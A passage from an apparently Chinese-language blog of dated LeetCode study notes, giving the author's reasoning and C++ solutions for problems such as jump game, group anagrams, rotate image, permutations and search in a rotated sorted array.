class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> ans<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 依据子区间左值排序</span>        <span class="token function">sort</span><span class="token punctuation">(</span>intervals<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> intervals<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> intervals<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> right <span class="token operator">=</span> intervals<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> intervals<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果当前区间的左值小于等于上一个区间的右值，说明有重叠</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 更新右值</span>                right <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>right<span class="token punctuation">,</span> intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 没有重叠，将上一个区间加入结果集</span>                ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>left<span class="token punctuation">,</span> right<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 更新左右值</span>                left <span class="token operator">=</span> intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                right <span class="token operator">=</span> intervals<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 最后一个子区间处理后需要加入结果集</span>        ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>left<span class="token punctuation">,</span> right<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="跳跃游戏">2023-09-12：<ahref="https://leetcode.cn/problems/jump-game/description/">55.跳跃游戏</a></h3><h4 id="我思-22">我思</h4><ol type="1"><li>每走一步，都能够确定目前的活动范围，所以范围之内，在其他的下标处，需要确定新的活动范围，但是都需要计算，但是<code>O(n)</code>已经不错了</li></ol><h4 id="实现-22">实现</h4><ol type="1"><li><p>其实代码还是蛮简单</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">canJump</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 能够到达的最右位置</span>        <span class="token keyword">int</span> enableMostRight <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment">// 一次遍历:O(n)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 取等号</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> enableMostRight<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 在最右范围内更新最右值</span>                enableMostRight <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>enableMostRight<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 超出了目前的最右位置</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 遍历完所有元素，自然能够到达最后一个位置</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="字母异位词分组">2023-05-14: <ahref="https://leetcode.cn/problems/group-anagrams/">49.字母异位词分组</a></h3><blockquote><p>失踪人口回归</p></blockquote><ul><li><p><strong>我思</strong></p><p><code>字母异位词</code>的特点：每个单词具有相同的字母，只是顺序不一样。如果将他们排序，就会是同一个单词。</p><p><strong>但是</strong>我没想到好的处理方式，事实上我们可以将这个排序（唯一）的词作为<code>key</code>,而用一个<code>vector&lt;string&gt;</code>作为值而存储</p></li><li><p>法1：<strong>排序</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> <span class="token function">groupAnagrams</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> strs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        unordered_map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> mp<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>string<span class="token operator">&amp;</span> str<span class="token operator">:</span> strs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            string key <span class="token operator">=</span> str<span class="token punctuation">;</span>            <span class="token function">sort</span><span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mp<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> res<span class="token punctuation">;</span>        <span class="token comment">// [_, v] 是一个 C++17 中引入的结构化绑定（Structured</span>        <span class="token comment">// Binding）的语法。它的作用是将 mp</span>        <span class="token comment">// 中的元素解包成两个变量，第一个变量是占位符</span>        <span class="token comment">// _，表示忽略掉键值对中的键，第二个变量 v</span>        <span class="token comment">// 则表示键值对中的值。</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token operator">&amp;</span> <span class="token punctuation">[</span>_<span class="token punctuation">,</span> v<span class="token punctuation">]</span> <span class="token operator">:</span> mp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/05/14/4f3qECMXYAQvRDZ.png"alt="image-20230514160154371" /><figcaption aria-hidden="true">image-20230514160154371</figcaption></figure></li><li><p>法2：<strong>计数</strong></p><p>难以理解的代码:我选择法1</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> <span class="token function">groupAnagrams</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> strs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 自定义对 array&lt;int, 26> 类型的哈希函数</span>        <span class="token keyword">auto</span> arrayHash <span class="token operator">=</span> <span class="token punctuation">[</span>fn <span class="token operator">=</span> hash<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token keyword">const</span> array<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token operator">></span><span class="token operator">&amp;</span> arr<span class="token punctuation">)</span> <span class="token operator">-></span> size_t <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">accumulate</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0u</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>size_t acc<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>acc <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">fn</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        unordered_map<span class="token operator">&lt;</span>array<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token operator">></span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">,</span> <span class="token keyword">decltype</span><span class="token punctuation">(</span>arrayHash<span class="token punctuation">)</span><span class="token operator">></span> <span class="token function">mp</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> arrayHash<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>string<span class="token operator">&amp;</span> str<span class="token operator">:</span> strs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            array<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token operator">></span> counts<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> length <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                counts<span class="token punctuation">[</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">]</span> <span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            mp<span class="token punctuation">[</span>counts<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> ans<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> mp<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> mp<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ans<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>it<span class="token operator">-></span>second<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="旋转图像">2023-02-12：<ahref="https://leetcode.cn/problems/rotate-image/">48. 旋转图像</a></h3><ul><li><p>我思</p><ul><li>原地操作（只能采用交换）</li><li>对二维数组的操作</li><li>我感觉是个找规律题：甚至我尝试把坐标变换列出来，去找规律，但是不行<ul><li>变化步数和（列变+行变）＝n</li></ul></li><li>事实上：旋转90度，可我们直接把原先的列当成行去读，就是旋转后的答案，但是<strong>原地操作</strong></li><li></li><li>从几何视角看：直线角度变化<ul><li>从中间到外围是一个个正方形</li></ul></li></ul></li><li><p>参考</p><ul><li>事实上就是找规律</li><li>关于矩阵的知识联想：转置，对称。(正好是容易进行的操作）</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">rotate</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 00 02    10 01   20 00</span>        <span class="token comment">// 01 12    11 11   21 12</span>        <span class="token comment">// 02 22    12 21   22 20</span>        <span class="token comment">// 00 03    01 13   02 23   03 33</span>        <span class="token comment">// 10 02    11 12   12 22</span>        <span class="token comment">//</span>        <span class="token comment">// 规律就是转置+镜像(纵向)对称</span>        <span class="token comment">// 转置：限定j&lt;i 或 i &lt; j</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> matrix<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> matrix<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 对称</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> matrix<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> matrix<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>matrix<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="全排列">2022-01-23：<ahref="https://leetcode.cn/problems/permutations/">46. 全排列</a></h3><ul><li><p>我思</p><ul><li>回溯</li><li>问题是：取出第一个数字后，如何取出剩余其它数字</li></ul></li><li><p>参考：</p><ul><li>方法正确</li><li>解决我思的问题：<ul><li>法1：标记法</li><li>法2：数组分割交换</li></ul></li></ul></li><li><p>submit</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token comment">// 回溯法</span>    <span class="token comment">// 标记数组</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> path<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> ans<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">backTrace</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ans<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 没被标记则可使用</span>                path<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token function">backTrace</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>                path<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token comment">// 这句 必须加</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">permute</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token function">flag</span> <span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">backTrace</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/01/25/sAe9u5NWUXcJT7w.png"alt="image-20230125192151573" /><figcaption aria-hidden="true">image-20230125192151573</figcaption></figure></li></ul><h3 id="搜索旋转排序数组">2022-01-21: <ahref="https://leetcode.cn/problems/search-in-rotated-sorted-array/">33.搜索旋转排序数组</a></h3><ul><li>我思<ul><li>一开始没看懂题目，总感觉它想让我们求旋转后的数组</li><li>结果是考查找</li><li>然后把时间复杂度要求O(log n )看成了O(n)</li><li>根据时间复杂度O(log n )很容易联想到二分查找</li><li>二分查找要求有序，旋转数组后数组分成两段分别有序，那么如何找到这个分界点是一个问题。</li></ul></li><li>参考<ul><li>旋转后的数组必定：一部分有序，另一部分无序或有序；难以理解。</li><li>并且如果mid 小于right,则这部分必定有序</li><li>以上两条结论是如何解释</li></ul></li><li>submit</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">search</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 总的来说比起常规</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> mid<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 前半段有序</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">>=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 先查找前半段;注意等号</span>                    right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 在后半段查找</span>                    left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 后半段有序</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">></span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> target <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 先查找后半段</span>                    left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 在前半段查找</span>                    right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">==</span> target <span class="token operator">?</span> left <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/01/21/P8WAcpr6adluZLK.png"alt="image-20230121155254016" /><figcaption aria-hidden="true">image-20230121155254016</figcaption></figure><h3 id="下一个排列">2022-01-18: <ahref="https://leetcode.cn/problems/next-permutation/">31.下一个排列</a></h3><ul><li>我思：<ul><li>按题意：将所有的数字排列进行排序并构成一个循环，下一个排列就是按大小排在后一位的排列。</li><li>一个条件：必须原地修改，且是常数空间</li><li>我猜是：交换。<ul><li>但是这个交换规则应该是怎样呢。</li><li>注意到：他们的排序，实质就是转化为：从左到右，将数字放在相应的百十个位上形成的值。</li><li>一个特殊情况是：最大-》最小是一种特殊情况:<ul><li>其实这种情况可以理解为正序，则我们将它逆序即为所求。</li></ul></li><li>忽然想到一个词：正序。<ul><li>那么找到第一个正序（这个正序的交换得到的结果得是最小），并将他们进行交换即是所求。</li></ul></li></ul></li></ul></li><li>参考：<ul><li>看了题解，我的思路是正确的。但还需要修补：</li><li>首先，除了对发现的第一个逆序进行交换外，对他们之间的数字应该进行一次排序。可以确保在大于前一个排序后，这个排列还可能尽可能的小。即能满足下一个排列</li><li>其次，又是双指针法</li></ul></li><li>submit</li><li>以下不能保证left &gt;= 0</li></ul><figure><img src="https://s2.loli.net/2023/01/19/S1VuI6BoCOx4nmy.png"alt="image-20230119010340407" /><figcaption aria-hidden="true">image-20230119010340407</figcaption></figure><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">nextPermutation</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 双指针遍历</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> left <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token 